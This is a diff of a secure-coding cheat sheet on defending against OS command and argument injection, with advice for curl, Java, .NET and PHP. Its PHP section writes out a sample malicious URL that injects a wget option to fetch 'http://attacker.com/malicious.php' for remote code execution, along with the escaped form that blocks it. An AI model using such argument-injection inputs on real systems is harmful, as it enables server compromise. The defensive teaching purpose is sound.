@@ -33,6 +33,7 @@ Every OS Command Injection is also an Argument Injection. In this type of attack
 For example, if the user input is passed through an escape function to escape certain characters like `&`, `|`, `;`, etc.
 
 ```php
+
 system("curl " . escape($url));
 ```
 
@@ -40,7 +41,8 @@ which will prevent an attacker to run other commands.
 
 However, if the attacker controlled string contains an additional argument of the `curl` command:
 
-```
+```php
+
 system("curl " . escape("--help"))
 ```
 
@@ -59,8 +61,6 @@ For example use `mkdir()` instead of `system("mkdir /dir_name")`.
 If there are available libraries or APIs for the language you use, this is the preferred method.
 
 ### Defense option 2: Escape values added to OS commands specific to each OS
-
-**TODO: To enhance.**
 
 For examples, see [escapeshellarg()](https://www.php.net/manual/en/function.escapeshellarg.php) in PHP.
 
@@ -82,9 +82,9 @@ If calling a system command that incorporates user-supplied cannot be avoided, t
 
 - When it comes to the **commands** used, these must be validated against a list of allowed commands.
 - In regards to the **arguments** used for these commands, they should be validated using the following options:
-    - **Positive or allow list input validation**: Where are the arguments allowed explicitly defined.
-    - **Allow list Regular Expression**: Where a list of good, allowed characters and the maximum length of the string are defined. Ensure that metacharacters like ones specified in `Note A` and white-spaces are not part of the Regular Expression. For example, the following regular expression only allows lowercase letters and numbers and does not contain metacharacters. The length is also being limited to 3-10 characters: `^[a-z0-9]{3,10}$`
-- According to **Guideline 10** of this [POSIX](https://pubs.opengroup.org/onlinepubs/9699919799/basedefs/V1_chap12.html), *The first -- argument that is not an option-argument should be accepted as a delimiter indicating the end of options. Any following arguments should be treated as operands, even if they begin with the '-' character.* For example, `curl -- $url` will prevent an argument injection even if the `$url` is malformed and contains an additional argument.
+    - **Positive or allowlist input validation**: Where are the arguments allowed explicitly defined.
+    - **Allowlist Regular Expression**: Where a list of good, allowed characters and the maximum length of the string are defined. Ensure that metacharacters like ones specified in `Note A` and whitespaces are not part of the Regular Expression. For example, the following regular expression only allows lowercase letters and numbers and does not contain metacharacters. The length is also being limited to 3-10 characters: `^[a-z0-9]{3,10}$`
+- For commands that support it, use `--` to end option parsing. In [curl](https://curl.se/docs/manpage.html#OPTIONS), later arguments are still URL operands: `--` does not prevent additional transfers. Pass exactly one validated URL as one argument using a process API, and disable curl's [URL globbing](https://curl.se/docs/manpage.html#GLOBBING) with `--globoff`. Do not interpolate an unquoted value into a shell command. Argument separation does not validate the destination; apply [SSRF protections](Server_Side_Request_Forgery_Prevention_Cheat_Sheet.md).
 
 **Note A:**
 
@@ -107,13 +107,15 @@ These additional defenses are:
 
 In Java, use [ProcessBuilder](https://docs.oracle.com/javase/8/docs/api/java/lang/ProcessBuilder.html) and the command must be separated from its arguments.
 
-*Note about the Java's `Runtime.exec` method behavior:*
+`Runtime.exec(String)` is [deprecated since Java 18](https://docs.oracle.com/en/java/javase/21/docs/api/java.base/java/lang/Runtime.html) as error-prone: it splits the command String into tokens on whitespace only, so an argument that contains a space is broken into several tokens, which is how untrusted input can add extra arguments (see [Argument Injection](#argument-injection)). Use `ProcessBuilder` or `Runtime.exec(String[])` instead, passing the program and each argument as separate elements. Separating the arguments does not replace validating them.
+
+*Note about the behavior of Java's `Runtime.exec(String)` method:*
 
 There are many sites that will tell you that Java's `Runtime.exec` is exactly the same as `C`'s system function. This is not true. Both allow you to invoke a new program/process.
 
-However, `C`'s system function passes its arguments to the shell (`/bin/sh`) to be parsed, whereas `Runtime.exec` tries to split the string into an array of words, then executes the first word in the array with the rest of the words as parameters.
+However, `C`'s system function passes its arguments to the shell (`/bin/sh`) to be parsed, whereas `Runtime.exec(String)` tries to split the string into an array of words, then executes the first word in the array with the rest of the words as parameters.
 
-**`Runtime.exec` does NOT try to invoke the shell at any point and does not support shell metacharacters**.
+**`Runtime.exec(String)` does NOT try to invoke the shell at any point and does not support shell metacharacters**.
 
 The key difference is that much of the functionality provided by the shell that could be used for mischief (chaining commands using  `&`, `&&`, `|`, `||`, etc,  redirecting input and output) would simply end up as a parameter being passed to the first command, likely causing a syntax error or being thrown out as an invalid parameter.
 
@@ -189,14 +191,14 @@ ERROR :
 *Incorrect usage:*
 
 ```java
-ProcessBuilder b = new ProcessBuilder("C:\DoStuff.exe -arg1 -arg2");
+ProcessBuilder b = new ProcessBuilder("C:\\DoStuff.exe -arg1 -arg2");
 ```
 
-In this example, the command together with the arguments are passed as a one string, making it easy to manipulate that expression and inject malicious strings.
+This creates a builder with one command-list element, not a program followed by two arguments. [`ProcessBuilder`](https://docs.oracle.com/en/java/javase/21/docs/api/java.base/java/lang/ProcessBuilder.html) represents the executable and its arguments as a list. The snippet does not start a process or demonstrate shell-command injection.
 
 *Correct Usage:*
 
-Here is an example that starts a process with a modified working directory. The command and each of the arguments are passed separately. This makes it easy to validate each term and reduces the risk of malicious strings being inserted.
+This illustrative example starts a process with a modified working directory and passes the executable and each argument separately. Keep the executable and working directory trusted, and validate any untrusted arguments for the invoked program. Argument separation does not replace [argument validation](#layer-2).
 
 ``` java
 ProcessBuilder pb = new ProcessBuilder("TrustedCmd", "TrustedArg1", "TrustedArg2");
@@ -208,32 +210,62 @@ pb.directory(new File("TrustedDir"));
 Process p = pb.start();
 ```
 
-### .Net
+### .NET
 
-See relevant details in the [DotNet Security Cheat Sheet](DotNet_Security_Cheat_Sheet.md#os-injection)
+- If starting a process is necessary, use a fixed, fully qualified executable path in `FileName` and set [`UseShellExecute = false`](https://learn.microsoft.com/en-us/dotnet/api/system.diagnostics.processstartinfo.useshellexecute#remarks). This starts the executable directly; it does not validate its arguments.
+- On modern .NET, add each argument separately with [`ProcessStartInfo.ArgumentList`](https://learn.microsoft.com/en-us/dotnet/api/system.diagnostics.processstartinfo.argumentlist#remarks). It handles escaping, but untrusted input remains a security risk. Validate each value against the called program's allowed options and operands, such as permitted paths or destinations.
+- Do not pass untrusted input to command interpreters such as `cmd.exe`, `powershell.exe`, or `sh -c`.
+- .NET Framework has no `ArgumentList`. Avoid constructing `Arguments` from untrusted input; if necessary, restrict values to a command-specific allowlist that needs no quoting. [`Arguments` parsing](https://learn.microsoft.com/en-us/dotnet/api/system.diagnostics.processstartinfo.arguments#remarks) depends on the target program and platform.
 
 ### PHP
 
-In PHP use [escapeshellarg()](https://www.php.net/manual/en/function.escapeshellarg.php) or [escapeshellcmd()](https://www.php.net/manual/en/function.escapeshellcmd.php) rather than [exec()](https://www.php.net/manual/en/function.exec.php), [system()](https://www.php.net/manual/en/function.system.php), [passthru()](https://www.php.net/manual/en/function.passthru.php).
+PHP exposes two helper functions when you must pass user input to a shell: `escapeshellarg()` and `escapeshellcmd()`.
 
-## Related articles
+`escapeshellarg()`:  Ensures the user can pass only one parameter to the command, cannot add extra parameters, and cannot execute a different command.
 
-### Description of Command Injection Vulnerability
+`escapeshellcmd()`: Ensures the user can execute only the intended command, can pass unlimited parameters, but cannot execute other commands.
 
-- OWASP [Command Injection](https://owasp.org/www-community/attacks/Command_Injection).
+It is always preferable to use `escapeshellarg()` rather than `escapeshellcmd()` when dealing with user input.
 
-### How to Avoid Vulnerabilities
+For example, consider this code using `wget` with `escapeshellcmd()`:
 
-- C Coding: [Do not call system()](https://wiki.sei.cmu.edu/confluence/pages/viewpage.action?pageId=87152177).
+```php
+$url = $_GET['url'];
+$command = 'wget --directory-prefix=..\temp ' . $url;
+system(escapeshellcmd($command));
+```
 
-### How to Review Code
+If the user provides:
 
-- OWASP [Reviewing Code for OS Injection](https://wiki.owasp.org/index.php/Reviewing_Code_for_OS_Injection).
+```text
+http://victim.com/download.php?url=--directory-prefix=. http://attacker.com/malicious.php
+```
 
-### How to Test
+`escapeshellcmd()` will still allow this extra parameter meaning the attacker can override the original `--directory-prefix` option, save the file in the current directory and then achieve remote command execution on the server.
 
-- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/) article on [Testing for Command Injection](https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/12-Testing_for_Command_Injection.html).
+The safe approach is to use `escapeshellarg()` so that the URL is treated as a single argument:
 
-### External References
+```php
+$url = $_GET['url'];
+$command = 'wget --directory-prefix=..\temp ' . escapeshellarg($url);
+system($command);
+```
 
-- [CWE Entry 77 on Command Injection](https://cwe.mitre.org/data/definitions/77.html).
+Now the malicious input becomes:
+
+```text
+wget --directory-prefix=..\temp '--directory-prefix=. http://attacker.com/malicious.php'
+```
+
+Here, the second `--directory-prefix` is part of the quoted string, not a real option, so the attack fails.
+
+In addition, it is good security practice to follow these recommendations:  
+
+- **Hardcode the command**: never allow the user to choose which executable to run.  
+- **Hardcode options**: required flags (e.g., `--directory-prefix`) should be in the code, not in user input.  
+- **Validate and restrict input as much as possible**: apply strict validation rules, whitelists, and format checks to minimize the attack surface.
+
+## References
+
+- [SEI CERT C: Do not call system()](https://cmu-sei.github.io/secure-coding-standards/sei-cert-c-coding-standard/rules/environment-env/env33-c/)
+- [CWE-77: Command Injection](https://cwe.mitre.org/data/definitions/77.html)
